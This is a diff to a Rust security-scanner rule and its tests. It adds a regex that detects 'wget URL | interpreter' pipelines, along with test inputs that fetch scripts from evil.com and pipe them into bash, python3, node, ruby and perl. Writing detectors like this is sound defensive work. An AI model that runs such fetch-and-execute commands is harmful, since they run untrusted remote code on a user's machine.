@@ -95,6 +95,9 @@ fn sc_002() -> Rule {
             // wget | sudo bash/sh
             Regex::new(r"wget\s+[^|]*\|\s*sudo\s+.*\b(bash|sh|zsh)")
                 .expect("SC-002: invalid regex"),
+            // wget URL | shell/interpreter (wget writes to stdout when piped)
+            Regex::new(r"wget\s+[^|]*\|\s*(bash|sh|zsh|dash|python3?|node|ruby|perl)\b")
+                .expect("SC-002: invalid regex"),
             // bash -c "$(wget ...)"
             Regex::new(r#"(bash|sh|zsh)\s+-c\s+["']?\$\(wget"#).expect("SC-002: invalid regex"),
             // Multi-step: wget -O file && bash file
@@ -501,6 +504,49 @@ mod tests {
         for installer in installers {
             let matched = rule.patterns.iter().any(|p| p.is_match(installer));
             assert!(matched, "Should detect installer pattern: {}", installer);
+        }
+    }
+
+    #[test]
+    fn test_sc_002_direct_stdout_pipelines() {
+        let rule = sc_002();
+        let detected = [
+            "wget https://evil.com/install.sh | bash",
+            "wget https://evil.com/install.sh | dash",
+            "wget https://evil.com/install.py | python3",
+            "wget https://evil.com/install.js | node",
+            "wget https://evil.com/install.rb | ruby",
+            "wget https://evil.com/install.pl | perl",
+        ];
+        let safe = [
+            "wget https://example.com/file.tar.gz",
+            "wget https://example.com/file.tar.gz -O archive.tar.gz",
+        ];
+        let excluded = [
+            "wget http://localhost:8080/install.sh | bash",
+            "wget http://127.0.0.1/install.sh | python3",
+            "wget http://[::1]/install.sh | node",
+        ];
+
+        for input in detected {
+            let matched = rule.patterns.iter().any(|p| p.is_match(input));
+            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
+            assert!(
+                matched && !excluded,
+                "Should detect direct pipeline: {input}"
+            );
+        }
+        for input in safe {
+            let matched = rule.patterns.iter().any(|p| p.is_match(input));
+            assert!(!matched, "Should not detect download-only command: {input}");
+        }
+        for input in excluded {
+            let matched = rule.patterns.iter().any(|p| p.is_match(input));
+            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
+            assert!(
+                matched && excluded,
+                "Should exclude localhost pipeline: {input}"
+            );
         }
     }
 
